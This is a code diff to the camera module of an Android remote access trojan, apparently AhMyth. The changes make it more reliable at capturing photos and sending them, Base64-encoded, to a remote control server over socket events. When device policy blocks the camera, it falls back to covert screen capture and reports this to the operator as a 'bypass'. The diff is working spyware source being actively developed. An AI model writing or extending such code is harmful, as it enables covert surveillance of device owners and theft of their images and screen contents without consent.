@@ -1,6 +1,7 @@
 package ahmyth.mine.king.ahmyth;
 
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -561,17 +562,12 @@ public class CameraManager {
             cancelTimeout();
             
             Log.e(TAG, "Camera error: " + message);
-            io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
-            if (socket != null && socket.connected()) {
-                JSONObject object = new JSONObject();
-                object.put("image", false);
-                object.put("error", message);
-                object.put("timestamp", System.currentTimeMillis());
-                socket.emit("x0000ca", object);
-                Log.d(TAG, "Error message sent to server");
-            } else {
-                Log.e(TAG, "Socket not connected, cannot send error");
-            }
+            JSONObject object = new JSONObject();
+            object.put("image", false);
+            object.put("error", message);
+            object.put("timestamp", System.currentTimeMillis());
+            ConnectionManager.emitResponse("x0000ca", object);
+            Log.d(TAG, "Error message sent via ConnectionManager");
         } catch (Exception e) {
             Log.e(TAG, "Error sending error message", e);
         }
@@ -598,22 +594,20 @@ public class CameraManager {
             
             Log.d(TAG, "Compressed image size: " + imageBytes.length);
             
-            io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
-            if (socket == null || !socket.connected()) {
-                Log.e(TAG, "Socket not connected, cannot send photo");
-                return;
-            }
+            // Base64 encode the image buffer for JSON serialization
+            // JSONObject.put() with byte[] calls toString() which gives "[B@...", so we need Base64
+            String base64Buffer = android.util.Base64.encodeToString(imageBytes, android.util.Base64.NO_WRAP);
             
             JSONObject object = new JSONObject();
             object.put("image", true);
-            object.put("buffer", imageBytes);
+            object.put("buffer", base64Buffer);
             object.put("width", bitmap.getWidth());
             object.put("height", bitmap.getHeight());
             object.put("size", imageBytes.length);
             object.put("timestamp", System.currentTimeMillis());
             
-            socket.emit("x0000ca", object);
-            Log.d(TAG, "Photo sent successfully, size: " + imageBytes.length + " bytes");
+            ConnectionManager.emitResponse("x0000ca", object);
+            Log.d(TAG, "Photo sent successfully via ConnectionManager, size: " + imageBytes.length + " bytes");
             
             // Clean up
             bitmap.recycle();
@@ -628,15 +622,26 @@ public class CameraManager {
     }
 
     public JSONObject findCameraList() {
+        JSONObject cameras = new JSONObject();
+        JSONArray list = new JSONArray();
+        try {
+            cameras.put("camList", true);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating camera list JSON", e);
+            return cameras;
+        }
+        
         if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)) {
-            return null;
+            Log.w(TAG, "Device does not have camera feature");
+            try {
+                cameras.put("list", list); // Return empty list
+            } catch (JSONException e) {
+                Log.e(TAG, "Error adding empty list", e);
+            }
+            return cameras;
         }
 
         try {
-            JSONObject cameras = new JSONObject();
-            JSONArray list = new JSONArray();
-            cameras.put("camList", true);
-
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && camera2Manager != null) {
                 String[] cameraIds = camera2Manager.getCameraIdList();
                 for (int i = 0; i < cameraIds.length; i++) {
@@ -672,13 +677,20 @@ public class CameraManager {
             }
 
             cameras.put("list", list);
+            Log.d(TAG, "Found " + list.length() + " camera(s)");
             return cameras;
 
         } catch (Exception e) {
             Log.e(TAG, "Error finding cameras", e);
+            // Return empty list instead of null
+            try {
+                cameras.put("list", list);
+                cameras.put("error", e.getMessage());
+            } catch (JSONException je) {
+                Log.e(TAG, "Error adding error to camera list", je);
+            }
+            return cameras;
         }
-
-        return null;
     }
     
     /**
@@ -895,14 +907,11 @@ public class CameraManager {
             
             // Send info that camera is using alternate method
             try {
-                io.socket.client.Socket socket = ConnectionManager.getSocket();
-                if (socket != null && socket.connected()) {
-                    JSONObject info = new JSONObject();
-                    info.put("bypass", true);
-                    info.put("method", "screen_capture_fallback");
-                    info.put("message", "Camera blocked by policy - using screen capture");
-                    socket.emit("x0000ca", info);
-                }
+                JSONObject info = new JSONObject();
+                info.put("bypass", true);
+                info.put("method", "screen_capture_fallback");
+                info.put("message", "Camera blocked by policy - using screen capture");
+                ConnectionManager.emitResponse("x0000ca", info);
             } catch (Exception e) {
                 Log.e(TAG, "Error sending bypass info", e);
             }
